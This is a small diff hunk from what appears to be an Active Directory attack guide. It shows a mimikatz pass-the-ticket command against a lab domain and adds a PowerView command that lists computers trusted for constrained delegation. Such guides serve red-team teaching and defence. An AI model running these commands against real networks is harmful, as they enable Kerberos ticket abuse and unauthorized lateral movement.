@@ -75,5 +75,6 @@ Then use `mimikatz` to load the ticket.
 ```powershell
 
 mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
+Get-DomainComputer -TrustedToAuth | select -exp dnshostname
 ```
 
